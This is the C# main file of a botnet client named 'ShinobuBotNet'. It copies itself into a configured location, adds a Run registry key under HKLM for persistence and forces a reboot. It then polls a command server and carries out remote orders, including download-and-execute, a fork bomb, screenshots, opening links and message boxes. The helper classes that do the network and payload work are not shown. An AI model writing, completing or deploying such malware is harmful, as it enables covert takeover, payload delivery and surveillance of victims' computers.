using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Net;
using System.Threading.Tasks;
using System.Windows;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Diagnostics;

namespace ShinobuBotNet
{
    class cMain
    {
        static string last_cmd = string.Empty;

        static void Main(string[] args)
        {
            if (System.IO.File.Exists(configs.CheakFile))
            {
                while (true)
                {
                    string id = API.Get_ID();
                    string html = API.GetCommand(id);
                    if(html == "null")
                    {
                        continue;
                    }

                    if (last_cmd == html)
                    {
                        Thread.Sleep(configs.delay);
                        continue;
                    }
                    last_cmd = html;

                    cmd command = new cmd(html);
                    Execute(command);

                    Thread.Sleep(configs.delay);
                }
            }


            else
            {
                if(cheaker.CheakDir() == true)
                {
                    API.creat_cheak_File();
                    API.connect();

                    while (true)
                    {
                        string id = API.Get_ID();
                        string html = API.GetCommand(id);
                        if (html == "null")
                        {
                            continue;
                        }

                        if (last_cmd == html)
                        {
                            Thread.Sleep(configs.delay);
                            continue;
                        }
                        last_cmd = html;

                        cmd command = new cmd(html);
                        Execute(command);

                        Thread.Sleep(configs.delay);
                    }
                }
                else
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, configs.FullPath, true);

                    string applicationName = configs.FileName;
                    const string pathRegistryKeyStartup =
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

                    using (RegistryKey registryKeyStartup =
                                Registry.LocalMachine.OpenSubKey(pathRegistryKeyStartup, true))
                    {
                        registryKeyStartup.SetValue(
                            applicationName,
                            string.Format("\"{0}\"", configs.Path));
                    }
                    Process.Start("shutdown", "/r /t 0");
                }
            }
        }


        static void Execute(cmd CMD)
        {
            switch (CMD.ComType)
            {
                case "open_link":
                    functions.OpenLink(CMD.ComContent);
                    break;

                case "download_execute":
                    functions.DownloadExecute(CMD.ComContent);
                    break;

                case "exit":
                    Environment.Exit(0);
                    break;

                case "ping":
                    functions.ping();
                    break;

                case "forkbomb":
                    functions.forkbomb();
                    break;

                case "screnshot":
                    functions.screenshot();
                    break;

                case "msg_box":
                    functions.MSG(CMD.ComContent);
                    break;

                case "uninstall":
                    functions.uninstall();
                    break;

            }
        }
    }
}
